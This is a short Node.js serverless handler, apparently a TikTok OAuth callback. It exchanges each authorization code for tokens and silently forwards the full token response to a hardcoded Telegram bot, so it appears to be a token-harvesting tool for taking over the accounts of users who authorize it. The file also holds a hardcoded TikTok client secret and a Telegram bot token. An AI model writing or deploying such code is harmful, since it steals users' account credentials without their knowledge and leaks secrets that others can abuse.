const https = require('https');

const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
const TELEGRAM_CHAT_ID = '7644255708';

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
  return new Promise((resolve) => {
    https.get(url, (res) => resolve(res.statusCode)).on('error', () => resolve(0));
  });
}

module.exports = async (req, res) => {
  const urlParams = new URLSearchParams(req.url.split('?')[1]);
  const code = urlParams.get('code');

  if (!code) return res.end('Waiting for code...');

  const postData = `client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth-lzkjg04nh-anadkkkkkkkks-projects.vercel.app/api/callback`;

  const options = {
    hostname: 'open.tiktokapis.com',
    path: '/v2/oauth/token/',
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(postData) }
  };

  const tokenReq = https.request(options, (response) => {
    let data = '';
    response.on('data', (c) => data += c);
    response.on('end', async () => {
      await sendToTelegram('🚀 كود جديد مستلم:\n\n' + data);
      res.end('Data processed and sent.');
    });
  });

  tokenReq.write(postData);
  tokenReq.end();
};
